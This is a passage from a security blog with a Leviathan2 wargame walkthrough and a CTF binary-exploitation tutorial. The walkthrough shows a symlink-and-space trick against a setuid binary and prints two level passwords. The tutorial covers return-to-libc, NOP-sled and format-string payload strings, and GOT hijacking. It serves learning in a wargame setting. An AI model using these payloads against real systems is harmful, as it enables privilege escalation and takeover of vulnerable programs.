<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>info file: Tell us about the entry points:
</span><span class='line'>info functions: Tell us about the functions in the binary.</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>Examples</h3>

<ol>
<li>Consider a binary which is setuid and used to read files.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ./printfile 
</span><span class='line'>*** File Printer ***
</span><span class='line'>Usage: ./printfile filename
</span><span class='line'>
</span><span class='line'>leviathan2@melinda:~$ ls -la
</span><span class='line'>-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14 10:32 printfile</span></code></pre></td></tr></table></div></figure>
We need to read 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ls -l /etc/leviathan_pass/leviathan3 
</span><span class='line'>-r-------- 1 leviathan3 leviathan3 11 Nov 14 10:32 /etc/leviathan_pass/leviathan3</span></code></pre></td></tr></table></div></figure>
Let's see the ltrace of the binary while accessing a file which we are allowed to read
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2 
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/etc/leviathan_pass/leviathan2", 4)                                                                            = 0
</span><span class='line'>snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                  = 39
</span><span class='line'>system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
</span><span class='line'> &lt;no return ...&gt;
</span><span class='line'>--- SIGCHLD (Child exited) ---
</span><span class='line'>&lt;... system resumed&gt; )                                                                                                 = 0
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
Let see what happen when we try to access file which we don't have permission to.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/etc/leviathan_pass/leviathan3", 4)                                                                            = -1
</span><span class='line'>puts("You cant have that file..."You cant have that file...
</span><span class='line'>)                                                                                     = 27
</span><span class='line'>+++ exited (status 1) +++</span></code></pre></td></tr></table></div></figure>
So it's a matter of tricking access(), if the call to access() succeeds then it calls system("cat file"), so if pass the argument printfile /etc/issue, then it works.
We can get around it by using a space in our file name. Eg: touch foo\ bar. then we create a symlink to the password file and call it foo. ln -s /etc/leviathanpass/leviathan3 foo

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ mkdir /tmp/levi
</span><span class='line'>leviathan2@melinda:~$ cd /tmp/levi
</span><span class='line'>leviathan2@melinda:/tmp/levi$ ls
</span><span class='line'>leviathan2@melinda:/tmp/levi$ ln -s /etc/leviathan_pass/leviathan3 ./foo
</span><span class='line'>leviathan2@melinda:/tmp/levi$ touch foo\ bar
</span><span class='line'>leviathan2@melinda:/tmp/levi$ ~/printfile foo\ bar 
</span><span class='line'>Ahdiemoo1j
</span><span class='line'>/bin/cat: bar: No such file or directory</span></code></pre></td></tr></table></div></figure>
</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Binary Exploitation]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/10/learning-from-ctf-binary-exploitation/"/>
    <updated>2014-11-10T02:12:01+05:30</updated>
    <id>http://bitvijays.github.io/blog/2014/11/10/learning-from-ctf-binary-exploitation</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF&rsquo;s and Over The Wire Wargame.</p>

<!-- more -->


<h3>Thanks to superkojiman, barrebas, et0x who helped me learning the concepts.</h3>

<ol>
Let's start with some basic concepts and then we would see some examples which would help to clear the concepts.

<li>
Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address.
<br>
<img class="left" src="http://bitvijays.github.io/images/big-endian.png" width="250" height="250">
<img class="right" src="http://bitvijays.github.io/images/little-endian.png" width="250" height="250">
</li>
<br><br><br><br><br><br><br><br><br>
<li>When you get a binary for exploitation, we need to find whether it is 32-bit or 64-bit ELF, which platform it is running, whether any buffer overflow prevention techniques has been used, what is EIP offset.
<ul>
<li>Executable binary is running on whether x86 or x86-64.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>uname -a</span></code></pre></td></tr></table></div></figure>
</li>
<li>Whether the binary is compiled for 32 bit or 64 bit.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file binary_file</span></code></pre></td></tr></table></div></figure>
</li>
<li>Multiple Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE).
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Address space Layout Randomization     : Kernel
</span><span class='line'>Executable Stack Protection            : Compiler
</span><span class='line'>Stack smashing protection              : Compiler
</span><span class='line'>Position Independent Executables       : Compiler
</span><span class='line'>Fortify Source                         : Compiler
</span><span class='line'>Stack Protector                        : Compiler</span></code></pre></td></tr></table></div></figure> 
<ul>
<li> Which buffer overflow prevention techniques are used can be found by running <a href="http://www.trapkit.de/tools/checksec.html">Checksec Script</a>. This script is present in <a href="https://github.com/longld/peda">gdb-peda</a>.</li>
<li>Whether the stack of binary is executable is not can be found by readelf tool. If Program header GNU_STACK has RWE flag, if it has E flag, it's executable.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:~$ readelf -l /narnia/narnia8 | grep GNU_STACK
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10</span></code></pre></td></tr></table></div></figure>
In order to make the stack executable, the program needs to be compiled with -z execstack option and to disable stack smashing option -fno-stack-protector should be used.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -ggdb -m32 -fno-stack-protector -z execstack -o buffer1 buffer1.c</span></code></pre></td></tr></table></div></figure>
</li>

<li>Address Space Layout Randomization (ASLR) controlled by /proc/sys/kernel/randomize_va_space.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Three Values:
</span><span class='line'>
</span><span class='line'>0  : Disable ASLR. This setting is applied if the kernel is booted with the norandmaps boot parameter.
</span><span class='line'>1  : Randomize the positions of the stack, virtual dynamic shared object (VDSO) page, and shared memory regions. The base address of the data segment is located immediately after the end of the executable code segment.
</span><span class='line'>2  : Randomize the positions of the stack, VDSO page, shared memory regions, and the data segment. This is the default setting.</span></code></pre></td></tr></table></div></figure>
You can change the setting temporarily by writing a new value to /proc/sys/kernel/randomize_va_space, for example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo value &gt; /proc/sys/kernel/randomize_va_space</span></code></pre></td></tr></table></div></figure>
To change the value permanently, add the setting to /etc/sysctl.conf, for example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kernel.randomize_va_space = value
</span><span class='line'>and run the sysctl -p command.</span></code></pre></td></tr></table></div></figure>
If you change the value of randomize_va_space, you should test your application stack to ensure that it is compatible with the new setting.

If necessary, you can disable ASLR for a specific program and its child processes by using the following command:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% setarch `uname -m` -R program [args ...]</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>


<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb to create a random pattern which can be used to find the offset and pattern_offset.rb to find the exact offset. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/share/metasploit-framework/tools/pattern_create.rb 200
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</span><span class='line'>
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_offset.rb 0x37654136
</span><span class='line'>[*] Exact match at offset 140</span></code></pre></td></tr></table></div></figure>

</li>
<li>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run gdb &lt;program&gt;
</span><span class='line'>p &&lt;variablename&gt;</span></code></pre></td></tr></table></div></figure> </li>

</ul>
</li>

<li><strong>Buffer overflow</strong>:
<ul>
<li>Either you can put the shellcode on the buffer and then redirect the EIP to NOP Sled followed by the shellcode (provided the shellcode used is correct and the stack is executable).</li>
<li>However, if the stack is not executable or the shellcode is not working (happens sometimes), then we can either,
<ul>
<li>export a environment variable with shellcode, find the address of env variable in the stack and then set the return address to starting of the shellcode and get a shell</li>
<li>use return2libc which is a type of ROP: find the address of system function, find the address of "/bin/sh" in the stack and execute it like system("/bin/sh"). It is in the format of 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;ADDRofSYSTEM&gt; &lt;4ArbitraryBytes for Return Address&gt; &lt;argument for system[/bin/sh]&gt;</span></code></pre></td></tr></table></div></figure>
4Arbitrary Bytes for Return address could be a JUNK address or "\xCC\xCC\xCC\xCC" or address of exit function. 
<ul>
<li>If set to \xCC\xCC\xCC\xCC so after system executes, it tries to return to 0xcccccccc. \xcc is good just to check if you're actually jumping to your shellcode, but once you've verified that it works, then you should remove it.</li> 
<li>If a JUNK address is put, the binary will have already executed the shellcode but it will segfault. 
<li>If the proper address of exit() is used, binary will exit cleanly.</li>
</ul>
It's better to use /bin/sh instead of /bin/bash since bash drops privs. If /bin/bash is used, it will launch /bin/bash but you'll find that you haven't elevated your privileges and this can get confusing. so either find another string that points to /bin/sh or set your own env  variable like DASH=/bin/sh and reference that.

Good paper to review is <a href="http://www.exploit-db.com/papers/13204/">Bypassing non-executable-stack during Exploitation (return-to-libc)</a>.
 </li>

<li>Sometimes you need to put a cat to keep the shell alive
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(cat input; cat) | ./binary
</span><span class='line'>input is the payload you are sending.</span></code></pre></td></tr></table></div></figure></li>

</ul></li>
<li>Sometimes we need a shellcode to write a string or for getting a actual shell. A good reference can be found @<a href="http://www.exploit-db.com/papers/13224/">Introduction to Writing Shellcode</a>. Information about various system call integar value need to be present in EAX register is here <a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html">Linux System Call Table</a>.

Let's see a small example where we move an address to eax register and jump to it. Address which we are moving to eax would contain our shellcode.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>;test.asm
</span><span class='line'>[SECTION .text]
</span><span class='line'>global _start
</span><span class='line'>_start:
</span><span class='line'>        mov eax, 0xffffd8bc
</span><span class='line'>  jmp eax</span></code></pre></td></tr></table></div></figure>
Just good to know: global directive is NASM specific. It is for exporting symbols in your code to where it points in the object code generated. Here you mark _start symbol global so its name is added in the object code (a.o). The linker (ld) can read that symbol in the object code and its value so it knows where to mark as an entry point in the output executable. When you run the executable it starts at where marked as _start in the code.

If a global directive missing for a symbol that symbol will not be placed in the object code's export table so linker has no way of knowing about the symbol.
<br><br>
We can compile the asm file by 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nasm -f elf test.asm</span></code></pre></td></tr></table></div></figure>
link it
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ld -o test test.o
</span><span class='line'>
</span><span class='line'>#If you get the below error
</span><span class='line'>ld: i386 architecture of input file `test.o' is incompatible with i386:x86-64 output
</span><span class='line'>
</span><span class='line'>either 
</span><span class='line'>
</span><span class='line'>Use 64 bits instead of 32 for your loader and compile it with the following command:
</span><span class='line'>nasm -f elf64 loader.asm -o loader.o
</span><span class='line'>
</span><span class='line'>or 
</span><span class='line'>
</span><span class='line'>If want compile the file as 32 bits composition, you can use:
</span><span class='line'>
</span><span class='line'>ld -m elf_i386 -s -o file.o file</span></code></pre></td></tr></table></div></figure>
To see the byte code
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>objdump -d &lt;file&gt;</span></code></pre></td></tr></table></div></figure></li>
<li>What we mostly do when exploiting a buffer overflow (when placing the shellcode on stack) is we place our shellcode before EIP, we should also check if we can put our shellcode after EIP. This is particularly useful when some kind of check for shellcode is present in address before EIP. Example: Suppose our EIP is present at offset 80. We would usually do
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'print "\x90"*50 + "30 Bytes of ShellCode" + "4 Bytes return address to NOP or shellcode in left"'</span></code></pre></td></tr></table></div></figure>
However, if somekind of check for alphanumeric characters is present for first 80 bytes you won't be able to put your shellcode in those 80 bytes. At that point of time you should check if you can overflow post EIP and redirect. For example
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'print "A"*80 + "4 Bytes return address to NOP or shellcode in right" + "\x90"*50 + "30 Bytes of ShellCode"'</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
 </li>


<li><strong>Format String Vulnerability</strong>:

<ul>
<li>Definition: If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By doing so, the behaviour of the format function is changed, and the attacker may get control over the target application. A format string is an ASCIIZ string that contains text and format parameters.
Example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("The magic number is: %d\n", 1911);</span></code></pre></td></tr></table></div></figure>
</li>

<li>The behaviour of the format function is controlled by the format string. The function retrieves the parameters requested by the format string from the stack.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("Number %d has no address, number %d has: %08x\n", i, a, &a);</span></code></pre></td></tr></table></div></figure>
From within the printf function the stack looks like:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>stack top
</span><span class='line'>. . .
</span><span class='line'>&lt;&a&gt;
</span><span class='line'>&lt;a&gt;
</span><span class='line'>&lt;i&gt;
</span><span class='line'>A
</span><span class='line'>. . .
</span><span class='line'>stack bottom</span></code></pre></td></tr></table></div></figure></li>
<li>Crashing the Program: By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("%s%s%s%s%s%s%s%s%s%s%s%s");</span></code></pre></td></tr></table></div></figure>
Because ‘%s’ displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped.</li>
<li>Viewing the stack: how some parts of the stack memory by using a format string like this: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("%08x.%08x.%08x.%08x.%08x\n");</span></code></pre></td></tr></table></div></figure>
This works, because we instruct the printf-function to retrieve five parameters from the stack and display them as 8-digit padded hexadecimal numbers. So a possible output may look like:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>40012980.080628c4.bffff7a4.00000005.08059c04</span></code></pre></td></tr></table></div></figure>
This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards the low addresses.</li>

<li>Viewing Memory at any location: We can look at memory locations different from the stack memory by providing an address to the format string.

Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the ‘%s’ parameter. To modify the stack pointer we can simply use dummy parameters that will ‘dig’ up the stack by printing junk:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("AAA0AAA1_%08x.%08x.%08x.%08x.%08x");</span></code></pre></td></tr></table></div></figure>
The ‘%08x’ parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of ‘%08x’ parameters correctly, we could just display memory from an arbitrary address, by appending ‘%s’ to our string.
In our case the address is illegal and would be ‘AAA0’. Lets replace it with a real one.
Example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>address = 0x08480110
</span><span class='line'>address (encoded as 32 bit le string): "\x10\x01\x48\x08" 
</span><span class='line'>printf ("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|");</span></code></pre></td></tr></table></div></figure>
Will dump memory from 0x08480110 until a NUL byte is reached. If we cannot reach the exact format string boundary by using 4-Byte pops (‘%08x’), we have to pad the format string, by prepending one, two or three junk characters. 3 This is analog to the alignment in buffer overflow exploits.
</li>

<li>Overwriting of Arbitrary Memory: There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int)) 
at the address: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n"</span></code></pre></td></tr></table></div></figure>
The format string above will overwrite four bytes at 0xbfffc8c0 with a small integer number. We have reached one of our goals: we can write to arbitrary addresses. By using a dummy parameter ‘%nu’ we are able to control the counter written by ‘%n’, at least a bit. </li>

<li>Direct Parameter Access: The direct parameter access is controlled by the ‘$’ qualifier: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("%6$d\n", 6, 5, 4, 3, 2, 1);</span></code></pre></td></tr></table></div></figure> Prints ‘1’, because the ‘6$’ explicitly addresses the 6th parameter on the stack.
</li>
<li>The above text is taken from and a good paper to read for format string is <a href="www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Format_String/files/formatstring-1.2.pdf">Exploiting Format String Vulnerabilities</a></li>
<li>We can write two bytes by %hn and one byte by %hhn.</li>
<li> How to write four bytes?
Suppose we need to write 0x8048706 to the address 0xffffd64c.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HOB:0x0804
</span><span class='line'>LOB:0x8706
</span><span class='line'>
</span><span class='line'>If HOB &lt; LOB
</span><span class='line'>
</span><span class='line'>[addr+2][addr] = \x4e\xd6\xff\xff\x4c\xd6\xff\xff
</span><span class='line'>%.[HOB - 8]x   = 0x804 - 8 = 7FC (2044) = %.2044x
</span><span class='line'>%[offset]$hn   = %6\$hn
</span><span class='line'>%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
</span><span class='line'>%[offset+1]$hn = %7\$hn
</span><span class='line'>
</span><span class='line'>`python -c 'print "\x4e\xd6\xff\xff\x4c\xd6\xff\xff" +"%.2044x%6\$hn %.32514x%7\$hn"'`</span></code></pre></td></tr></table></div></figure>
</li>

<li>Hijack the Global Offset Table with pointers:
<ul>
<li>Whatis: The Global Offset Table redirects position independent address calculations to an absolute location and is
located in the .got section of an ELF executable or shared object. It stores the final (absolute) location
of a function calls symbol, used in dynamically linked code. When a program requests to use printf() for
instance, after the rtld locates the symbol, the location is then relocated in the GOT and allows for the
executable via the Procedure Linkage Table, to directly access the symbols location.</li>
<li>when you disassemble main and printf statement is present, you will get like
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   0x080484b9 &lt;+60&gt;:   call   0x8048330 &lt;printf@plt&gt;           &lt;----PLT</span></code></pre></td></tr></table></div></figure>
if you further disassemble printf
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ pdisass printf
</span><span class='line'>Dump of assembler code for function printf@plt:
</span><span class='line'>   0x08048330 &lt;+0&gt;: jmp    DWORD PTR ds:0x8049788           &lt;----GOT Address
</span><span class='line'>   0x08048336 &lt;+6&gt;: push   0x0
</span><span class='line'>   0x0804833b &lt;+11&gt;:    jmp    0x8048320
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>
Further disassembling the address 0x8049788
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ pdisass 0x8049788
</span><span class='line'>Dump of assembler code from 0x8049788 to 0x80497a8:
</span><span class='line'>   0x08049788 &lt;printf@got.plt+0&gt;:   add    DWORD PTR ss:[eax+ecx*1],0x46
</span><span class='line'>   0x0804978d &lt;fgets@got.plt+1&gt;:    add    DWORD PTR [eax+ecx*1],0x56
</span><span class='line'>   0x08049791 &lt;puts@got.plt+1&gt;: add    DWORD PTR [eax+ecx*1],0x66
</span><span class='line'>   0x08049795 &lt;__gmon_start__@got.plt+1&gt;:   add    DWORD PTR [eax+ecx*1],0x76
</span><span class='line'>   0x08049799 &lt;__libc_start_main@got.plt+1&gt;:    add    DWORD PTR [eax+ecx*1],0x0
</span><span class='line'>   0x0804979d &lt;data_start+1&gt;:   add    BYTE PTR [eax],al
</span><span class='line'>   0x0804979f &lt;data_start+3&gt;:   add    BYTE PTR [eax],al
</span><span class='line'>   0x080497a1 &lt;__dso_handle+1&gt;: add    BYTE PTR [eax],al
</span><span class='line'>   0x080497a3 &lt;__dso_handle+3&gt;: add    BYTE PTR [eax],al
</span><span class='line'>   0x080497a5 &lt;stdin@@GLIBC_2.0+1&gt;: add    BYTE PTR [eax],al
</span><span class='line'>   0x080497a7 &lt;stdin@@GLIBC_2.0+3&gt;: add    BYTE PTR [eax],al
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>
Objdump reflects the same (notice the +1) GOT address:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>objdump --dynamic-reloc ./behemoth3 
</span><span class='line'>
</span><span class='line'>./behemoth3:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE 
</span><span class='line'>08049778 R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>080497a4 R_386_COPY        stdin
</span><span class='line'>08049788 R_386_JUMP_SLOT   printf
</span><span class='line'>0804978c R_386_JUMP_SLOT   fgets
</span><span class='line'>08049790 R_386_JUMP_SLOT   puts
</span><span class='line'>08049794 R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>08049798 R_386_JUMP_SLOT   __libc_start_main</span></code></pre></td></tr></table></div></figure>

Quick diagram what it looks like:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>So a quick diagram of what happens looks kind'a like this:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  [printf()] &lt;--------------------------------
</span><span class='line'>     |                                       |
</span><span class='line'>     --------------&gt; [PLT]---&gt;[d_r_resolve]--|
</span><span class='line'>                             |           |         |
